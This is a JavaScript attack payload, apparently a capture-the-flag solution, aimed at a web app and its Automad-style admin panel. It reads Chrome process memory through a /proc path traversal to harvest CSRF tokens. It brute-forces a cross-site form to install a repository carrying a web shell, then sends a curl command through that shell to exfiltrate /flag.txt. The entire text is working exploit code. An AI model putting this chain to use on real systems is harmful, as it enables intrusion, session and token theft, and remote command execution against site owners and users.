(async()=>{
const REPO={platform:'github',name:'2ash1/static',repositoryUrl:'https://github.com/2Ash1/static',branch:'main'};
const SHELL='http://admin-app/packages/2ash1/static/index.php';
const post=t=>fetch('/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(t.replace(/[^A-Za-z0-9 !.:()]/g,' '))});
const r=async p=>{
 try{
  let ac=new AbortController();
  let tm=setTimeout(()=>ac.abort(),1200);
  let x=await fetch('/profile'+p+'%3f',{cache:'no-store',signal:ac.signal});
  let t=await x.text();
  clearTimeout(tm);
  return [x.status,t];
 }catch(e){return [0,'']}
};
const rt=async p=>(await r(p))[1];
const cmd=()=>{
 let ck=document.cookie.split(';')[0];
 return `curl -s -X POST http://app/edit -H "Cookie: ${ck}" --data title=flag --data-urlencode content="$(python3 -c 'print(open(\"/flag.txt\",\"rb\").read().hex())')"`;
};
const candidates=new Set();
const addCandidates=d=>{
 let low=d.toLowerCase();
 let m=(low.match(/[a-f0-9]{64}/g)||[]);
 m=m.concat((low.match(/(?:[a-f0-9]\.){63}[a-f0-9]/g)||[]).map(x=>x.replace(/\./g,'')));
 for(let x of m){
  if(candidates.size>=60)break;
  if(/^([a-f0-9])\1+$/.test(x))continue;
  candidates.add(x);
 }
};
const submitToken=csrf=>{
 let w=open('about:blank','amcsrf');
 let f=document.createElement('form');
 f.method='POST';
 f.action='http://admin-app/_api/package-manager/add-repository';
 f.target='amcsrf';
 let a=(k,v)=>{let i=document.createElement('input');i.name=k;i.value=v;f.appendChild(i)};
 a('__csrf__',csrf);
 a('__json__',JSON.stringify(REPO));
 document.body.appendChild(f);
 f.submit();
};
const tryInstall=()=>{
 let arr=[...candidates].slice(0,40);
 post('candidates '+arr.length);
 arr.forEach((csrf,i)=>setTimeout(()=>{
  post('try '+(i+1));
  submitToken(csrf);
 },i*650));
 setTimeout(()=>{location.href=SHELL+'?cmd='+encodeURIComponent(cmd())},Math.max(35000,arr.length*650+25000));
};
const tryChunk=d=>{
 let low=d.toLowerCase();
 addCandidates(low);
 if(!(low.includes('csrf')||low.includes('c.s.r.f')||low.includes('__csrf__')||low.includes('_._.c.s.r.f')||low.includes('automad')||low.includes('a.u.t.o.m.a.d')||low.includes('dashboard')||low.includes('d.a.s.h.b.o.a.r.d')||low.includes('/_api')))return '';
 let m=low.match(/[a-f0-9]{64}/g)||[];
 m=m.concat((low.match(/(?:[a-f0-9]\.){63}[a-f0-9]/g)||[]).map(x=>x.replace(/\./g,'')));
 return m.find(x=>!/^0+$/.test(x))||'';
};
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
post('stage start');
let fr=document.createElement('iframe');
fr.src='http://admin-app/dashboard/home';
fr.style='width:1px;height:1px;position:fixed;left:-9px;top:-9px';
document.body.appendChild(fr);
post('admin iframe');
await sleep(5000);
let pc=0;
for(let pid=1;pid<5000;pid++){
 let c=await rt('/proc/'+pid+'/cmdline');
 if(!/chrome|chromium/i.test(c))continue;
 if(c.includes('--type=zygote')||c.includes('--type=gpu')||c.includes('--type=utility'))continue;
 if(!c.includes('--type=renderer')&&pc>0)continue;
 pc++;
 post('pid '+pid+' '+(c.includes('--type=renderer')?'renderer':'browser'));
 let mr=await r('/proc/'+pid+'/maps');
 post('maps '+mr[0]+' '+mr[1].length);
 if(mr[0]!=200||mr[1].length<10)continue;
 let m=mr[1];
 let regs=[];
 let lines=m.split('\n').filter(line=>line.includes('rw'));
 post('rwlines '+lines.length);
 for(let line of lines){
  let q=line.split(/\s+/),x=q[0],perm=q[1]||'',name=q[5]||'';
  if(!x||!perm.includes('r')||!perm.includes('w'))continue;
  let [s,e]=x.split('-').map(v=>parseInt(v,16));
  if(!s||!e||e<=s)continue;
  let sz=e-s;
  if(sz>0x2000000)continue;
  let pri=(name=='[heap]'?0:name.includes('/dev/shm')?1:name?3:2);
  if(pri==3)continue;
  regs.push({s,e,sz,name,pri});
 }
 regs.sort((a,b)=>a.pri-b.pri||b.sz-a.sz);
 regs=regs.slice(0,35);
 post('regions '+regs.length);
 let scanned=0;
 for(let g of regs){
  let step=Math.max(0x20000,Math.floor(g.sz/24));
  let [st,probe]=await r('/proc/'+pid+'/mem?offset=0x'+g.s.toString(16)+'&limit=64');
  if(st!=200)continue;
  for(let off=g.s;off<g.e;off+=step){
   scanned++;
   if(scanned%80==0)post('scan '+scanned);
   if(scanned>260){post('scan limit');break}
   let d=await rt('/proc/'+pid+'/mem?offset=0x'+off.toString(16)+'&limit=8000');
   let z=tryChunk(d);
   if(z){candidates.add(z)}
   if(candidates.size>=60){tryInstall();return}
  }
  if(scanned>260)break;
 }
 if(pc>=3)break;
}
if(candidates.size){tryInstall();return}
post('csrf not found pids '+pc);
})();
